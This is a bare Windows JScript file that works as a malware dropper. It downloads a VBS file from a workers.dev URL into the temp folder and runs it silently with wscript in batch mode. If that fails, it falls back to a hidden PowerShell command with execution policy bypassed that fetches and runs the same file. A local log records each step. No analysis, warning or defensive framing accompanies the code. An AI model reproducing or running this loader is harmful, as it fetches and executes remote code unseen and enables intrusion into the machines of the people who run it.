var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

var url = "https://crimson-shadow-5337.aledreamer1234.workers.dev/555.vbs";
var path = fso.GetSpecialFolder(2) + "\\thetruth.vbs";

var log = fso.CreateTextFile(fso.GetSpecialFolder(2) + "\\js_test.log", true);
log.WriteLine("JS started: " + new Date());

try {
    log.WriteLine("Downloading: " + url);

    // WinHttp handles TLS 1.2 natively on modern Windows
    var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    xhr.Option(9) = 2720; // WinHttpRequestOption_SecureProtocols = TLS1.1|TLS1.2|TLS1.3
    xhr.Open("GET", url, false);
    xhr.SetRequestHeader("User-Agent", "Mozilla/5.0");
    xhr.Send();

    log.WriteLine("Status: " + xhr.Status);
    if (xhr.Status == 200) {
        log.WriteLine("Data length: " + xhr.ResponseText.length);

        // Use ADODB.Stream for clean file writing
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 2; // adTypeText
        stream.Charset = "utf-8";
        stream.Open();
        stream.WriteText(xhr.ResponseText);
        stream.SaveToFile(path, 2); // adSaveCreateOverWrite
        stream.Close();

        log.WriteLine("Saved to: " + path);
        log.WriteLine("Executing...");
        shell.Run('wscript "' + path + '" //B', 0, true);
        log.WriteLine("VBS executed");
    }
} catch (e) {
    log.WriteLine("ERROR: " + e.message);
    log.WriteLine("Fallback PowerShell...");
    // Fallback: use PowerShell to handle the download + exec (TLS 1.2 forced)
    var psCmd = "powershell -w hidden -nop -ep bypass -c \""
        + "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
        + "Invoke-WebRequest -Uri '" + url + "' -OutFile '" + path + "';"
        + "wscript '" + path + "' //B\"";
    shell.Run(psCmd, 0, true);
    log.WriteLine("PS fallback executed");
}
log.Close();
